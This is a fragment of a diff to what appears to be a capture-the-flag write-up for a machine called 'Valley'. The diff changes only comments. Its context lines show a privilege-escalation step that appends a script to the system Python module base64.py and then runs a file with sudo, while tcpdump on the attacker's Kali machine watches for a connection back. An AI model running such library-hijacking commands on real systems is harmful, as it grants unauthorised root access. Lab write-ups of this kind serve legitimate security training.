@@ -330,11 +330,11 @@ valley@valley:~$ cat /dev/null > base64.py
 # without touching file
 valley@valley:~$ cat /tmp/root.py >> /usr/lib/python3.8/base64.py
 
-# while executing file do enter password
+# while executing file do not enter password
 valley@valley:~$ sudo ./base64.py
 ``` 
 ```bash
-# In another terminal on Kali Linux, you can intercept the connection between the client and the server.
+# In another terminal on Kali Linux, you can intercept the connection between the client (Kali) and the server (Valley) to see if there's any response back.
 $ sudo tcpdump -i tun0 
 ```
 
